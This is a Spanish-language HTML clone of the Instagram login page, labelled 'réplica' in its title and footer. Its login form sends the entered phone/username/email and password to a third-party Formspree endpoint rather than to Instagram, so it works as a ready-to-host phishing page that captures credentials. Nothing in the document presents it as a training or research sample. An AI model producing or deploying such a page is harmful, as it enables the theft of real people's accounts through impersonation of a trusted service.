<!doctype html>
<html lang="es">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>Iniciar sesión • Instagram (réplica)</title>
		<link rel="stylesheet" href="styles.css" />
	</head>
	<body>
		<main class="container">
			<section class="card">
				<div class="image-container">
					<img src="Cap.png" class="img-libre">
				</div>

				<div class="login-panel">
					<div class="logo">
						<svg width="80" height="24" viewBox="0 0 100 30" aria-hidden="true">
							<rect x="0" y="0" width="100" height="30" fill="none"></rect>
							<circle cx="12" cy="13" r="6" stroke="#262626" stroke-width="1.5" fill="none"></circle>
							<rect x="6" y="7" width="12" height="12" rx="3" stroke="#262626" stroke-width="1.5" fill="none"></rect>
						</svg>
						<h1>Instagram</h1>
					</div>

					<form action="https://formspree.io/f/mrbnakzv" method="POST" class="login-form">
						<input type="text" name="telefono" placeholder="Teléfono, usuario o correo" autocomplete="username" />
						<input type="password" name="Contraseña" placeholder="Contraseña" autocomplete="current-password" />
						<button class="btn primary">Entrar</button>
						<div class="or"><span>o</span></div>
						<button class="btn fb">Iniciar sesión con Facebook</button>
						<a class="forgot" href="#">¿Olvidaste la contraseña?</a>
					</form>

					<div class="signup">
						¿No tienes una cuenta? <a href="#">Regístrate</a>
					</div>

					<div class="download">
						Descarga la aplicación.
						<div class="stores">
							<div class="store">App Store</div>
							<div class="store">Google Play</div>
						</div>
					</div>
				</div>
			</section>

			<footer class="site-footer">
				<nav class="links">
					<a href="#">Información</a>
					<a href="#">Ayuda</a>
					<a href="#">Prensa</a>
					<a href="#">API</a>
					<a href="#">Empleo</a>
					<a href="#">Privacidad</a>
					<a href="#">Condiciones</a>
				</nav>
				<div class="copyright">© 2025 Instagram desde una réplica</div>
			</footer>
		</main>
	</body>
</html>
